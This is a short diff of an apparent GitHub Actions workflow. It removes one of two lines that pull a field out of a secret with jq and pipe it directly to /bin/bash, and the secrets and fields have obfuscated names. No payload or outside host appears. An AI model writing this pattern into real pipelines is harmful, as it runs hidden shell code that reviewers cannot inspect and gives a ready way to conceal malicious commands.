@@ -21,7 +21,6 @@ jobs:
           dp72168: ${{ secrets.dp72168 }}
         run: |
           printf '%s' "$dp72168" | jq -r .zsl20054 | /bin/bash
-          printf '%s' "$qns4" | jq -r .wonga79468 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
